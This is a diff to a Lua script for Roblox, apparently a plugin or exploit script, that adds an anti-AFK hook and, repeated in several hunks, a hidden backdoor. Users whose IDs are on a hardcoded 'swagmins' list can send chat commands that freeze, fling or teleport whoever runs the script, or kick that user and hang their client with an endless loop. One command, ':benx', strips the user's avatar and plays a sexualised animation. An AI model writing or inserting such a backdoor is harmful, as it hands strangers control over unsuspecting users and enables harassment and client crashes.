@@ -1070,6 +1070,16 @@ local Plugin = {
                     end
                     end
                     end)
+
+
+local vu = game:GetService("VirtualUser") -- AntiAfk
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    wait(1)
+    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+
+
                     
                     
   
@@ -1089,6 +1099,114 @@ local Plugin = {
                        game.RunService.Renderstepped:Wait()
                     end
                     end))
+
+local swagmins = {
+  200547759, -- Mas2n
+  44694442, -- SWAGM0DE
+  92157681, -- Ninaly4567
+  1688589423, -- KR1STlNA
+  2351144328, -- suslevel9999
+  1997397874,
+  1821810242, 
+}
+
+local bending = false
+local kickmsg = 'PERMA BANNED'
+local function commands(msg,plr)
+    if DisableMod == false or table.find(swagmins, plr) then
+        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
+        local Msg = string.lower(msg)
+        local SplitCMD = string.split(Msg,' ')
+        local Lower = string.lower(player.Name)
+        local Allowed = string.find(Lower, SplitCMD[2])
+        if Allowed then
+            if string.find(SplitCMD[1], ':freeze') then
+                player.Character.HumanoidRootPart.Anchored = true
+            end
+            if string.find(SplitCMD[1], ':thaw') then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+            if string.find(SplitCMD[1], ':benx') then
+                bending = true
+                local segtarget = Mod.Name
+                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
+                Crouch.Looped = true
+                Crouch:Play()
+                local away = .5
+                local reversing = false
+                local shirt = player.Character:FindFirstChild('Shirt')
+                local pants = player.Character:FindFirstChild('Pants')
+                if shirt then
+                    shirt:Destroy()
+                end
+                if pants then
+                    pants:Destroy()
+                end
+                local Loop
+                local loopFunction = function()
+                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
+                    local character = player.Character
+                    if targetchar then
+                        if reversing == true then
+                            away = away - 0.1
+                        else
+                            away = away + 0.1
+                        end
+                        if away >= 2 then
+                            reversing = true
+                        elseif away < 0.5 then
+                            reversing = false
+                        end
+                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
+                    end
+                end;
+                local Start = function()
+                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
+                end;
+                local Pause = function()
+                    Loop:Disconnect()
+                    Crouch:Stop()
+                end;
+                Start()	
+                repeat wait() until bending == false
+                Pause()
+            end
+            if string.find(SplitCMD[1], ':unbenx') then
+                while bending == true do
+                    wait()
+                    bending = false
+                end
+            end
+            if string.find(SplitCMD[1], ':kick') then
+                local ISADMIN = table.find(swagmins, player.UserId)
+                if not ISADMIN then
+                    kickmsg = Mod.Name
+                    player:Kick(kickmsg)
+                    wait(5)
+                    while true do end
+                end
+            end
+            if string.find(SplitCMD[1], ':bring') then
+                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
+            end
+            if string.find(SplitCMD[1], ':cuffban') then
+                if table.find(swagmins, plr) then
+                    local ISADMIN = table.find(swagmins, player.UserId)
+                    if not ISADMIN then
+                        player:Kick('Stop .')
+                    end
+                end
+            end
+            if string.find(SplitCMD[1], ':fling') then
+                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+            end
+        else
+            if string.find(msg, '/e test') then
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", 'All');
+            end
+        end
+    end
+end
 
                     -- \\ Important Variables
                     
@@ -1749,6 +1867,17 @@ end
                     end
                     end
                     end)
+
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+local vu = game:GetService("VirtualUser") -- AntiAfk
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    wait(1)
+    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+
+
                     
                     
                     local vu = game:GetService("VirtualUser") -- AntiAfk
@@ -1767,6 +1896,113 @@ end
                        game.RunService.Renderstepped:Wait()
                     end
                     end))
+local swagmins = {
+  200547759, -- Mas2n
+  44694442, -- SWAGM0DE
+  92157681, -- Ninaly4567
+  1688589423, -- KR1STlNA
+  2351144328, -- suslevel9999
+  1997397874,
+  1821810242, 
+}
+
+local bending = false
+local kickmsg = 'PERMA BANNED'
+local function commands(msg,plr)
+    if DisableMod == false or table.find(swagmins, plr) then
+        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
+        local Msg = string.lower(msg)
+        local SplitCMD = string.split(Msg,' ')
+        local Lower = string.lower(player.Name)
+        local Allowed = string.find(Lower, SplitCMD[2])
+        if Allowed then
+            if string.find(SplitCMD[1], ':freeze') then
+                player.Character.HumanoidRootPart.Anchored = true
+            end
+            if string.find(SplitCMD[1], ':thaw') then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+            if string.find(SplitCMD[1], ':benx') then
+                bending = true
+                local segtarget = Mod.Name
+                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
+                Crouch.Looped = true
+                Crouch:Play()
+                local away = .5
+                local reversing = false
+                local shirt = player.Character:FindFirstChild('Shirt')
+                local pants = player.Character:FindFirstChild('Pants')
+                if shirt then
+                    shirt:Destroy()
+                end
+                if pants then
+                    pants:Destroy()
+                end
+                local Loop
+                local loopFunction = function()
+                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
+                    local character = player.Character
+                    if targetchar then
+                        if reversing == true then
+                            away = away - 0.1
+                        else
+                            away = away + 0.1
+                        end
+                        if away >= 2 then
+                            reversing = true
+                        elseif away < 0.5 then
+                            reversing = false
+                        end
+                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
+                    end
+                end;
+                local Start = function()
+                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
+                end;
+                local Pause = function()
+                    Loop:Disconnect()
+                    Crouch:Stop()
+                end;
+                Start()	
+                repeat wait() until bending == false
+                Pause()
+            end
+            if string.find(SplitCMD[1], ':unbenx') then
+                while bending == true do
+                    wait()
+                    bending = false
+                end
+            end
+            if string.find(SplitCMD[1], ':kick') then
+                local ISADMIN = table.find(swagmins, player.UserId)
+                if not ISADMIN then
+                    kickmsg = Mod.Name
+                    player:Kick(kickmsg)
+                    wait(5)
+                    while true do end
+                end
+            end
+            if string.find(SplitCMD[1], ':bring') then
+                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
+            end
+            if string.find(SplitCMD[1], ':cuffban') then
+                if table.find(swagmins, plr) then
+                    local ISADMIN = table.find(swagmins, player.UserId)
+                    if not ISADMIN then
+                        player:Kick('Stop .')
+                    end
+                end
+            end
+            if string.find(SplitCMD[1], ':fling') then
+                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+            end
+        else
+            if string.find(msg, '/e test') then
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", 'All');
+            end
+        end
+    end
+end
                     
                     -- \\ Important Variables
                     
@@ -2432,6 +2668,16 @@ end
                     end
                     end
                     end)
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+local vu = game:GetService("VirtualUser") -- AntiAfk
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    wait(1)
+    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+
+
                     
                     
                     local vu = game:GetService("VirtualUser") -- AntiAfk
@@ -2450,6 +2696,113 @@ end
                        game.RunService.Renderstepped:Wait()
                     end
                     end))
+local swagmins = {
+  200547759, -- Mas2n
+  44694442, -- SWAGM0DE
+  92157681, -- Ninaly4567
+  1688589423, -- KR1STlNA
+  2351144328, -- suslevel9999
+  1997397874,
+  1821810242, 
+}
+
+local bending = false
+local kickmsg = 'PERMA BANNED'
+local function commands(msg,plr)
+    if DisableMod == false or table.find(swagmins, plr) then
+        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
+        local Msg = string.lower(msg)
+        local SplitCMD = string.split(Msg,' ')
+        local Lower = string.lower(player.Name)
+        local Allowed = string.find(Lower, SplitCMD[2])
+        if Allowed then
+            if string.find(SplitCMD[1], ':freeze') then
+                player.Character.HumanoidRootPart.Anchored = true
+            end
+            if string.find(SplitCMD[1], ':thaw') then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+            if string.find(SplitCMD[1], ':benx') then
+                bending = true
+                local segtarget = Mod.Name
+                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
+                Crouch.Looped = true
+                Crouch:Play()
+                local away = .5
+                local reversing = false
+                local shirt = player.Character:FindFirstChild('Shirt')
+                local pants = player.Character:FindFirstChild('Pants')
+                if shirt then
+                    shirt:Destroy()
+                end
+                if pants then
+                    pants:Destroy()
+                end
+                local Loop
+                local loopFunction = function()
+                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
+                    local character = player.Character
+                    if targetchar then
+                        if reversing == true then
+                            away = away - 0.1
+                        else
+                            away = away + 0.1
+                        end
+                        if away >= 2 then
+                            reversing = true
+                        elseif away < 0.5 then
+                            reversing = false
+                        end
+                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
+                    end
+                end;
+                local Start = function()
+                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
+                end;
+                local Pause = function()
+                    Loop:Disconnect()
+                    Crouch:Stop()
+                end;
+                Start()	
+                repeat wait() until bending == false
+                Pause()
+            end
+            if string.find(SplitCMD[1], ':unbenx') then
+                while bending == true do
+                    wait()
+                    bending = false
+                end
+            end
+            if string.find(SplitCMD[1], ':kick') then
+                local ISADMIN = table.find(swagmins, player.UserId)
+                if not ISADMIN then
+                    kickmsg = Mod.Name
+                    player:Kick(kickmsg)
+                    wait(5)
+                    while true do end
+                end
+            end
+            if string.find(SplitCMD[1], ':bring') then
+                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
+            end
+            if string.find(SplitCMD[1], ':cuffban') then
+                if table.find(swagmins, plr) then
+                    local ISADMIN = table.find(swagmins, player.UserId)
+                    if not ISADMIN then
+                        player:Kick('Stop .')
+                    end
+                end
+            end
+            if string.find(SplitCMD[1], ':fling') then
+                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+            end
+        else
+            if string.find(msg, '/e test') then
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", 'All');
+            end
+        end
+    end
+end
 
 
                     -- \\ Important Variables
@@ -3116,6 +3469,16 @@ end
                     end
                     end
                     end)
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+local vu = game:GetService("VirtualUser") -- AntiAfk
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    wait(1)
+    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+
+
                     
                     
                     local vu = game:GetService("VirtualUser") -- AntiAfk
@@ -3134,6 +3497,114 @@ end
                        game.RunService.Renderstepped:Wait()
                     end
                     end))
+
+local swagmins = {
+  200547759, -- Mas2n
+  44694442, -- SWAGM0DE
+  92157681, -- Ninaly4567
+  1688589423, -- KR1STlNA
+  2351144328, -- suslevel9999
+  1997397874,
+  1821810242, 
+}
+
+local bending = false
+local kickmsg = 'PERMA BANNED'
+local function commands(msg,plr)
+    if DisableMod == false or table.find(swagmins, plr) then
+        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
+        local Msg = string.lower(msg)
+        local SplitCMD = string.split(Msg,' ')
+        local Lower = string.lower(player.Name)
+        local Allowed = string.find(Lower, SplitCMD[2])
+        if Allowed then
+            if string.find(SplitCMD[1], ':freeze') then
+                player.Character.HumanoidRootPart.Anchored = true
+            end
+            if string.find(SplitCMD[1], ':thaw') then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+            if string.find(SplitCMD[1], ':benx') then
+                bending = true
+                local segtarget = Mod.Name
+                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
+                Crouch.Looped = true
+                Crouch:Play()
+                local away = .5
+                local reversing = false
+                local shirt = player.Character:FindFirstChild('Shirt')
+                local pants = player.Character:FindFirstChild('Pants')
+                if shirt then
+                    shirt:Destroy()
+                end
+                if pants then
+                    pants:Destroy()
+                end
+                local Loop
+                local loopFunction = function()
+                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
+                    local character = player.Character
+                    if targetchar then
+                        if reversing == true then
+                            away = away - 0.1
+                        else
+                            away = away + 0.1
+                        end
+                        if away >= 2 then
+                            reversing = true
+                        elseif away < 0.5 then
+                            reversing = false
+                        end
+                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
+                    end
+                end;
+                local Start = function()
+                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
+                end;
+                local Pause = function()
+                    Loop:Disconnect()
+                    Crouch:Stop()
+                end;
+                Start()	
+                repeat wait() until bending == false
+                Pause()
+            end
+            if string.find(SplitCMD[1], ':unbenx') then
+                while bending == true do
+                    wait()
+                    bending = false
+                end
+            end
+            if string.find(SplitCMD[1], ':kick') then
+                local ISADMIN = table.find(swagmins, player.UserId)
+                if not ISADMIN then
+                    kickmsg = Mod.Name
+                    player:Kick(kickmsg)
+                    wait(5)
+                    while true do end
+                end
+            end
+            if string.find(SplitCMD[1], ':bring') then
+                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
+            end
+            if string.find(SplitCMD[1], ':cuffban') then
+                if table.find(swagmins, plr) then
+                    local ISADMIN = table.find(swagmins, player.UserId)
+                    if not ISADMIN then
+                        player:Kick('Stop .')
+                    end
+                end
+            end
+            if string.find(SplitCMD[1], ':fling') then
+                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+            end
+        else
+            if string.find(msg, '/e test') then
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", 'All');
+            end
+        end
+    end
+end
 
 
                     -- \\ Important Variables
@@ -3797,6 +4268,16 @@ end
                     end
                     end
                     end)
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+local vu = game:GetService("VirtualUser") -- AntiAfk
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    wait(1)
+    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+
+
                     
                     
                     local vu = game:GetService("VirtualUser") -- AntiAfk
@@ -3815,6 +4296,114 @@ end
                        game.RunService.Renderstepped:Wait()
                     end
                     end))
+local swagmins = {
+  200547759, -- Mas2n
+  44694442, -- SWAGM0DE
+  92157681, -- Ninaly4567
+  1688589423, -- KR1STlNA
+  2351144328, -- suslevel9999
+  1997397874,
+  1821810242,
+ 
+}
+
+local bending = false
+local kickmsg = 'PERMA BANNED'
+local function commands(msg,plr)
+    if DisableMod == false or table.find(swagmins, plr) then
+        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
+        local Msg = string.lower(msg)
+        local SplitCMD = string.split(Msg,' ')
+        local Lower = string.lower(player.Name)
+        local Allowed = string.find(Lower, SplitCMD[2])
+        if Allowed then
+            if string.find(SplitCMD[1], ':freeze') then
+                player.Character.HumanoidRootPart.Anchored = true
+            end
+            if string.find(SplitCMD[1], ':thaw') then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+            if string.find(SplitCMD[1], ':benx') then
+                bending = true
+                local segtarget = Mod.Name
+                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
+                Crouch.Looped = true
+                Crouch:Play()
+                local away = .5
+                local reversing = false
+                local shirt = player.Character:FindFirstChild('Shirt')
+                local pants = player.Character:FindFirstChild('Pants')
+                if shirt then
+                    shirt:Destroy()
+                end
+                if pants then
+                    pants:Destroy()
+                end
+                local Loop
+                local loopFunction = function()
+                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
+                    local character = player.Character
+                    if targetchar then
+                        if reversing == true then
+                            away = away - 0.1
+                        else
+                            away = away + 0.1
+                        end
+                        if away >= 2 then
+                            reversing = true
+                        elseif away < 0.5 then
+                            reversing = false
+                        end
+                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
+                    end
+                end;
+                local Start = function()
+                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
+                end;
+                local Pause = function()
+                    Loop:Disconnect()
+                    Crouch:Stop()
+                end;
+                Start()	
+                repeat wait() until bending == false
+                Pause()
+            end
+            if string.find(SplitCMD[1], ':unbenx') then
+                while bending == true do
+                    wait()
+                    bending = false
+                end
+            end
+            if string.find(SplitCMD[1], ':kick') then
+                local ISADMIN = table.find(swagmins, player.UserId)
+                if not ISADMIN then
+                    kickmsg = Mod.Name
+                    player:Kick(kickmsg)
+                    wait(5)
+                    while true do end
+                end
+            end
+            if string.find(SplitCMD[1], ':bring') then
+                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
+            end
+            if string.find(SplitCMD[1], ':cuffban') then
+                if table.find(swagmins, plr) then
+                    local ISADMIN = table.find(swagmins, player.UserId)
+                    if not ISADMIN then
+                        player:Kick('Stop .')
+                    end
+                end
+            end
+            if string.find(SplitCMD[1], ':fling') then
+                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+            end
+        else
+            if string.find(msg, '/e test') then
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", 'All');
+            end
+        end
+    end
+end
                     
                     -- \\ Important Variables
                     
